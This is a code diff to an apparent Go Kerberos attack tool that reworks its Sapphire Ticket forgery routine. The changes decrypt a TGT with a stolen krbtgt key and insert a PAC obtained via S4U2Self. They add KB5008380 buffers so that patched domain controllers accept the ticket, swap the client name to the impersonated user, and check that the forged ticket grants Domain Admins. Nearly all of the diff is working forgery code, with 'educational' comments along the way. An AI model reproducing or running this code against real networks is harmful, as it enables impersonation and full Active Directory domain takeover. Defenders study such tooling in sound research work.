@@ -5,6 +5,7 @@ import (
 	"encoding/asn1"
 	"fmt"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/goobeus/goobeus/pkg/asn1krb5"
@@ -335,6 +336,46 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 	}
 	fmt.Printf("[+] Extracted PAC (%d bytes)\n", len(stolenPAC))
 
+	// DEBUG: Decode and show PAC groups to verify admin membership
+	if decodedPAC, err := pac.DecodePAC(stolenPAC); err == nil {
+		fmt.Println("[DEBUG] PAC Group Analysis:")
+		fmt.Printf("  User SID:       %s\n", decodedPAC.UserSID)
+		fmt.Printf("  Domain Admin:   %v\n", decodedPAC.IsDomainAdmin)
+		fmt.Printf("  Enterprise Admin: %v\n", decodedPAC.IsEnterpriseAdmin)
+		fmt.Printf("  Builtin Admin:  %v\n", decodedPAC.IsBuiltinAdmin)
+		fmt.Printf("  Groups (%d):\n", len(decodedPAC.Groups))
+		for _, g := range decodedPAC.Groups {
+			fmt.Printf("    - %s\n", g)
+		}
+		if len(decodedPAC.ExtraSIDs) > 0 {
+			fmt.Printf("  Extra SIDs (%d):\n", len(decodedPAC.ExtraSIDs))
+			for _, s := range decodedPAC.ExtraSIDs {
+				fmt.Printf("    - %s\n", s)
+			}
+		}
+	} else {
+		fmt.Printf("[DEBUG] Failed to decode PAC for analysis: %v\n", err)
+	}
+
+	// Step 3.5: Add KB5008380 buffers (PAC_REQUESTOR and PAC_ATTRIBUTES_INFO)
+	// EDUCATIONAL: KB5008380 Enforcement
+	// Since July 2022, Domain Controllers enforce PAC_REQUESTOR validation.
+	// S4U2Self service tickets don't have this buffer, so we must add it.
+	fmt.Println("[*] Step 3.5: Adding KB5008380 buffers (PAC_REQUESTOR, PAC_ATTRIBUTES_INFO)...")
+
+	// Extract user SID from the stolen PAC's LOGON_INFO
+	userSID, err := pac.ExtractUserSIDFromPAC(stolenPAC)
+	if err != nil {
+		fmt.Printf("[!] Warning: could not extract user SID: %v\n", err)
+		fmt.Println("[!] Proceeding without PAC_REQUESTOR - may fail on KB5008380 enforcing DCs")
+	} else {
+		fmt.Printf("[+] Extracted user SID: %s\n", userSID.String())
+		stolenPAC, err = pac.AddKB5008380Buffers(stolenPAC, userSID)
+		if err != nil {
+			fmt.Printf("[!] Warning: failed to add KB5008380 buffers: %v\n", err)
+		}
+	}
+
 	// Step 4: Decrypt original TGT with krbtgt key (get RAW bytes to preserve GeneralString)
 	fmt.Println("[*] Step 4: Decrypting original TGT with krbtgt key...")
 	decryptedTGTBytes, err := decryptTGTRaw(tgt, krbtgtKey, krbtgtEtype)
@@ -356,22 +397,37 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 	pac.DebugPAC(resignedPAC) // Debug after re-signing
 
 	// Step 6: Replace PAC in TGT
+	// CRITICAL: We MUST use the struct-based approach because:
+	// 1. We need to update the cname in EncTicketPart to the impersonated user
+	// 2. The raw bytes approach only replaces the PAC but keeps the original cname
+	// 3. Without matching cname, the service will reject the ticket (Access Denied)
 	fmt.Println("[*] Step 6: Replacing PAC in TGT...")
-	modifiedEncPartBytes, err := replacePACInRawBytes(decryptedTGTBytes, resignedPAC)
-	if err != nil {
-		// Raw bytes approach failed (likely PAC size mismatch) - fall back to struct approach
-		fmt.Printf("[!] Raw bytes approach failed: %v\n", err)
-		fmt.Println("[*] Falling back to struct-based approach with GeneralString fixup...")
+	fmt.Println("[*] Using struct-based approach to update both PAC and cname...")
 
+	// Force struct-based approach - the raw bytes approach is buggy (doesn't update cname)
+	var modifiedEncPartBytes []byte
+	{
 		// Use the struct approach
 		decryptedTGT, err := decryptTGT(tgt, krbtgtKey, krbtgtEtype)
 		if err != nil {
 			return nil, fmt.Errorf("failed to decrypt TGT: %w", err)
 		}
 
+		// DEBUG: Show what's in the original AuthorizationData
+		fmt.Printf("[DEBUG] Original EncTicketPart AuthorizationData: %d entries\n", len(decryptedTGT.AuthorizationData))
+		for i, ad := range decryptedTGT.AuthorizationData {
+			fmt.Printf("[DEBUG]   [%d] ADType=%d, DataLen=%d\n", i, ad.ADType, len(ad.ADData))
+		}
+
 		modifiedEncPart, err := replacePAC(decryptedTGT, resignedPAC)
 		if err != nil {
 			return nil, fmt.Errorf("failed to replace PAC: %w", err)
+		}
+
+		// DEBUG: Show what's in the modified AuthorizationData
+		fmt.Printf("[DEBUG] Modified EncTicketPart AuthorizationData: %d entries\n", len(modifiedEncPart.AuthorizationData))
+		for i, ad := range modifiedEncPart.AuthorizationData {
+			fmt.Printf("[DEBUG]   [%d] ADType=%d, DataLen=%d\n", i, ad.ADType, len(ad.ADData))
 		}
 
 		// CRITICAL: Change the cname in EncTicketPart to the impersonated user!
@@ -396,10 +452,11 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 
 		// Fix PrintableString (0x13) to GeneralString (0x1b) for Kerberos compatibility
 		modifiedEncPartBytes = fixPrintableToGeneralString(marshaled)
-		fmt.Println("[+] PAC replaced (with GeneralString fixup)")
-	} else {
-		fmt.Println("[+] PAC replaced (raw bytes)")
+		fmt.Println("[+] PAC replaced and cname updated")
 	}
+
+	// Legacy raw bytes code removed - it doesn't update cname which breaks authorization
+	_ = decryptedTGTBytes // silence unused warning
 
 	// Step 7: Re-encrypt and rebuild TGT
 	// EDUCATIONAL: We encrypt the modified EncTicketPart with krbtgt key (key usage 2).
@@ -441,6 +498,14 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 		fmt.Println("[DEBUG] Dumped kirbi to goobeus_kirbi_debug.bin")
 	}
 
+	// VERIFICATION: Decrypt and verify the forged ticket
+	fmt.Println("[*] Verifying forged ticket...")
+	if err := verifyForgedTicket(newTGT, krbtgtKey, krbtgtEtype, req.Impersonate); err != nil {
+		fmt.Printf("[!] Verification WARNING: %v\n", err)
+	} else {
+		fmt.Println("[+] Forged ticket verification PASSED")
+	}
+
 	b64, _ := newTGT.ToBase64()
 
 	return &SapphireTicketResult{
@@ -451,7 +516,320 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 	}, nil
 }
 
-// extractPACFromTicket decrypts the S4U ticket and extracts the PAC
+// verifyForgedTicket decrypts and verifies the forged ticket contents
+func verifyForgedTicket(kirbi *ticket.Kirbi, krbtgtKey []byte, etype int32, expectedUser string) error {
+	// Use the same decryption that works for parsing the original TGT
+	encTicketPart, err := decryptTGT(kirbi, krbtgtKey, etype)
+	if err != nil {
+		return fmt.Errorf("failed to decrypt forged ticket: %w", err)
+	}
+
+	fmt.Printf("[DEBUG] Decrypted forged ticket EncTicketPart\n")
+
+	// Verify cname
+	if len(encTicketPart.CName.NameString) > 0 {
+		cname := encTicketPart.CName.NameString[0]
+		if cname != expectedUser {
+			fmt.Printf("[!] cname mismatch: expected '%s', got '%s'\n", expectedUser, cname)
+		} else {
+			fmt.Printf("[+] cname verified: %s\n", cname)
+		}
+	} else {
+		fmt.Printf("[!] cname is empty\n")
+	}
+
+	// Verify AuthorizationData
+	fmt.Printf("[DEBUG] AuthorizationData in forged ticket: %d entries\n", len(encTicketPart.AuthorizationData))
+	for i, ad := range encTicketPart.AuthorizationData {
+		fmt.Printf("[DEBUG]   [%d] ADType=%d, DataLen=%d\n", i, ad.ADType, len(ad.ADData))
+	}
+
+	// Extract PAC from AuthorizationData
+	pacData := findPACInAuthData(encTicketPart.AuthorizationData)
+	if len(pacData) == 0 {
+		return fmt.Errorf("no PAC found in forged ticket AuthorizationData")
+	}
+	fmt.Printf("[+] PAC found in forged ticket: %d bytes\n", len(pacData))
+
+	// Decode PAC and show groups
+	decodedPAC, err := pac.DecodePAC(pacData)
+	if err != nil {
+		return fmt.Errorf("failed to decode PAC: %w", err)
+	}
+
+	fmt.Printf("[+] Forged ticket PAC verification:\n")
+	fmt.Printf("    User SID:      %s\n", decodedPAC.UserSID)
+	fmt.Printf("    Domain Admin:  %v\n", decodedPAC.IsDomainAdmin)
+	fmt.Printf("    Groups (%d):   ", len(decodedPAC.Groups))
+	for i, g := range decodedPAC.Groups {
+		if i > 0 {
+			fmt.Printf(", ")
+		}
+		// Just show RID
+		parts := strings.Split(g, "-")
+		if len(parts) > 0 {
+			fmt.Printf("%s", parts[len(parts)-1])
+		}
+	}
+	fmt.Println()
+
+	if !decodedPAC.IsDomainAdmin {
+		return fmt.Errorf("forged ticket PAC does NOT contain Domain Admins!")
+	}
+
+	return nil
+}
+
+// extractCNameFromEncTicketPart extracts the client name from decrypted EncTicketPart
+func extractCNameFromEncTicketPart(data []byte) string {
+	// EncTicketPart ::= [APPLICATION 3] SEQUENCE { ... [3] cname PrincipalName ... }
+	if len(data) < 20 {
+		return ""
+	}
+
+	// Skip APPLICATION 3 header
+	pos := 0
+	if data[0] == 0x63 { // APPLICATION 3
+		pos = 2
+		if data[1] == 0x82 {
+			pos = 4
+		} else if data[1] == 0x81 {
+			pos = 3
+		}
+	}
+
+	// Skip SEQUENCE header
+	if pos < len(data) && data[pos] == 0x30 {
+		if data[pos+1] == 0x82 {
+			pos += 4
+		} else if data[pos+1] == 0x81 {
+			pos += 3
+		} else {
+			pos += 2
+		}
+	}
+
+	// Find [3] cname
+	for pos < len(data) {
+		if data[pos] < 0xa0 {
+			break
+		}
+		tag := int(data[pos] - 0xa0)
+		fieldLen := 0
+		contentPos := pos + 2
+		if pos+1 < len(data) && data[pos+1] == 0x82 {
+			if pos+3 < len(data) {
+				fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
+			}
+			contentPos = pos + 4
+		} else if pos+1 < len(data) && data[pos+1] == 0x81 {
+			if pos+2 < len(data) {
+				fieldLen = int(data[pos+2])
+			}
+			contentPos = pos + 3
+		} else if pos+1 < len(data) && data[pos+1] < 0x80 {
+			fieldLen = int(data[pos+1])
+		}
+
+		if contentPos+fieldLen > len(data) {
+			break
+		}
+
+		if tag == 3 { // cname - PrincipalName
+			fieldData := data[contentPos : contentPos+fieldLen]
+			return extractPrincipalNameString(fieldData)
+		}
+
+		pos = contentPos + fieldLen
+	}
+	return ""
+}
+
+// extractPrincipalNameString extracts name-string from PrincipalName
+func extractPrincipalNameString(data []byte) string {
+	// PrincipalName ::= SEQUENCE { [0] name-type, [1] name-string SEQUENCE OF GeneralString }
+	if len(data) < 5 || data[0] != 0x30 {
+		return ""
+	}
+
+	seqPos := 2
+	if data[1] >= 0x80 {
+		seqPos = 2 + int(data[1]&0x7f)
+	}
+
+	for seqPos < len(data)-3 {
+		if data[seqPos] == 0xa1 { // [1] name-string
+			innerStart := seqPos + 2
+			if data[seqPos+1] >= 0x80 {
+				innerStart = seqPos + 3
+			}
+			if innerStart < len(data) && data[innerStart] == 0x30 {
+				stringsStart := innerStart + 2
+				if data[innerStart+1] >= 0x80 {
+					stringsStart = innerStart + 2 + int(data[innerStart+1]&0x7f)
+				}
+				if stringsStart < len(data)-2 {
+					if data[stringsStart] == 0x1b || data[stringsStart] == 0x13 {
+						strLen := int(data[stringsStart+1])
+						if stringsStart+2+strLen <= len(data) {
+							return string(data[stringsStart+2 : stringsStart+2+strLen])
+						}
+					}
+				}
+			}
+			break
+		}
+		seqPos++
+	}
+	return ""
+}
+
+// findPACInEncTicketPart finds the PAC in decrypted EncTicketPart
+func findPACInEncTicketPart(data []byte) []byte {
+	// EncTicketPart ::= [APPLICATION 3] SEQUENCE { ... [10] authorization-data ... }
+	if len(data) < 20 {
+		return nil
+	}
+
+	// Skip APPLICATION 3 header
+	pos := 0
+	if data[0] == 0x63 { // APPLICATION 3
+		pos = 2
+		if data[1] == 0x82 {
+			pos = 4
+		} else if data[1] == 0x81 {
+			pos = 3
+		}
+	}
+
+	// Skip SEQUENCE header
+	if pos < len(data) && data[pos] == 0x30 {
+		if data[pos+1] == 0x82 {
+			pos += 4
+		} else if data[pos+1] == 0x81 {
+			pos += 3
+		} else {
+			pos += 2
+		}
+	}
+
+	// Find [10] authorization-data
+	for pos < len(data) {
+		if data[pos] < 0xa0 {
+			break
+		}
+		tag := int(data[pos] - 0xa0)
+		fieldLen := 0
+		contentPos := pos + 2
+		if pos+1 < len(data) && data[pos+1] == 0x82 {
+			if pos+3 < len(data) {
+				fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
+			}
+			contentPos = pos + 4
+		} else if pos+1 < len(data) && data[pos+1] == 0x81 {
+			if pos+2 < len(data) {
+				fieldLen = int(data[pos+2])
+			}
+			contentPos = pos + 3
+		} else if pos+1 < len(data) && data[pos+1] < 0x80 {
+			fieldLen = int(data[pos+1])
+		}
+
+		if contentPos+fieldLen > len(data) {
+			break
+		}
+
+		if tag == 10 { // authorization-data
+			return verifyFindPACInAuthData(data[contentPos : contentPos+fieldLen])
+		}
+
+		pos = contentPos + fieldLen
+	}
+	return nil
+}
+
+// verifyFindPACInAuthData finds AD-WIN2K-PAC (type 128) in authorization-data bytes for verification
+func verifyFindPACInAuthData(data []byte) []byte {
+	// AuthorizationData ::= SEQUENCE OF SEQUENCE { ad-type, ad-data }
+	if len(data) < 5 || data[0] != 0x30 {
+		return nil
+	}
+
+	seqPos := 2
+	if data[1] >= 0x80 {
+		seqPos = 2 + int(data[1]&0x7f)
+	}
+
+	for seqPos < len(data)-4 {
+		if data[seqPos] != 0x30 {
+			break
+		}
+		innerLen := 0
+		innerStart := seqPos + 2
+		if data[seqPos+1] >= 0x80 {
+			innerLen = int(data[seqPos+2])
+			innerStart = seqPos + 3
+		} else {
+			innerLen = int(data[seqPos+1])
+		}
+
+		if innerStart+innerLen > len(data) {
+			break
+		}
+
+		innerData := data[innerStart : innerStart+innerLen]
+		// Look for [0] ad-type and [1] ad-data
+		adType := 0
+		var adData []byte
+
+		iPos := 0
+		for iPos < len(innerData)-4 {
+			if innerData[iPos] == 0xa0 && innerData[iPos+2] == 0x02 { // [0] ad-type INTEGER
+				adType = int(innerData[iPos+4])
+				iPos += int(innerData[iPos+1]) + 2
+			} else if innerData[iPos] == 0xa1 { // [1] ad-data
+				dataLen := 0
+				dataStart := iPos + 2
+				if innerData[iPos+1] >= 0x80 {
+					dataLen = int(innerData[iPos+2])
+					dataStart = iPos + 3
+				} else {
+					dataLen = int(innerData[iPos+1])
+				}
+				if dataStart+dataLen <= len(innerData) {
+					// Skip OCTET STRING tag
+					if innerData[dataStart] == 0x04 {
+						octetLen := 0
+						octetStart := dataStart + 2
+						if innerData[dataStart+1] >= 0x80 {
+							octetLen = int(innerData[dataStart+2])
+							octetStart = dataStart + 3
+						} else {
+							octetLen = int(innerData[dataStart+1])
+						}
+						if octetStart+octetLen <= len(innerData) {
+							adData = innerData[octetStart : octetStart+octetLen]
+						}
+					}
+				}
+				break
+			} else {
+				iPos++
+			}
+		}
+
+		if adType == 128 { // AD-WIN2K-PAC
+			return adData
+		} else if adType == 1 { // AD-IF-RELEVANT - recurse
+			if found := verifyFindPACInAuthData(adData); found != nil {
+				return found
+			}
+		}
+
+		seqPos = innerStart + innerLen
+	}
+	return nil
+}
 func extractPACFromTicket(kirbi *ticket.Kirbi, sessionKey []byte) ([]byte, error) {
 	if kirbi == nil || kirbi.Cred == nil || len(kirbi.Cred.Tickets) == 0 {
 		return nil, fmt.Errorf("no ticket in kirbi")
@@ -556,14 +934,10 @@ func decryptTGT(tgt *ticket.Kirbi, krbtgtKey []byte, etype int32) (*asn1krb5.Enc
 		return nil, fmt.Errorf("failed to decrypt TGT with krbtgt key: %w", err)
 	}
 
-	// Apply GeneralString workaround
-	decryptedFixed := make([]byte, len(decrypted))
-	copy(decryptedFixed, decrypted)
-	for i := range decryptedFixed {
-		if decryptedFixed[i] == 0x1b {
-			decryptedFixed[i] = 0x13
-		}
-	}
+	// Apply GeneralString workaround - ONLY for actual string tags, NOT binary data
+	// 0x1b (GeneralString tag) can appear naturally in binary PAC data, so we must only
+	// replace it when it appears as an actual ASN.1 tag followed by valid string length
+	decryptedFixed := fixGeneralStringForParsing(decrypted)
 
 	// Skip APPLICATION 3 header (0x63)
 	parseData := decryptedFixed
@@ -1375,4 +1749,61 @@ func buildLen(l int) []byte {
 		return []byte{0x81, byte(l)}
 	}
 	return []byte{0x82, byte(l >> 8), byte(l)}
+}
+
+// fixGeneralStringForParsing replaces GeneralString tags (0x1b) with PrintableString (0x13)
+// ONLY where they appear as actual ASN.1 string tags, not as data bytes.
+// This is critical because 0x1b can appear naturally in binary data like the PAC.
+func fixGeneralStringForParsing(data []byte) []byte {
+	result := make([]byte, len(data))
+	copy(result, data)
+
+	// Walk through the data looking for GeneralString patterns
+	// GeneralString (0x1b) followed by a valid length byte followed by ASCII content
+	for i := 0; i < len(result)-2; i++ {
+		if result[i] == 0x1b {
+			// Check if this looks like a valid GeneralString tag
+			// The next byte(s) should be a valid ASN.1 length
+			// And the content should be valid ASCII (like a realm name)
+			lenByte := result[i+1]
+			var contentStart int
+			var strLen int
+
+			if lenByte < 0x80 {
+				// Short form length
+				strLen = int(lenByte)
+				contentStart = i + 2
+			} else if lenByte == 0x81 && i+2 < len(result) {
+				// Long form, 1 byte length
+				strLen = int(result[i+2])
+				contentStart = i + 3
+			} else if lenByte == 0x82 && i+3 < len(result) {
+				// Long form, 2 byte length
+				strLen = (int(result[i+2]) << 8) | int(result[i+3])
+				contentStart = i + 4
+			} else {
+				continue // Invalid length encoding, not a real GeneralString
+			}
+
+			// Verify the content looks like a Kerberos string (realm, principal, etc.)
+			// Kerberos realms are typically uppercase ASCII with dots
+			if contentStart+strLen <= len(result) && strLen > 0 && strLen < 256 {
+				looksLikeString := true
+				for j := 0; j < min(strLen, 10); j++ { // Check first 10 chars
+					c := result[contentStart+j]
+					// Kerberos strings should contain printable ASCII
+					if c < 0x20 || c > 0x7e {
+						looksLikeString = false
+						break
+					}
+				}
+				if looksLikeString {
+					// This is likely a real GeneralString, convert to PrintableString
+					result[i] = 0x13
+				}
+			}
+		}
+	}
+
+	return result
 }
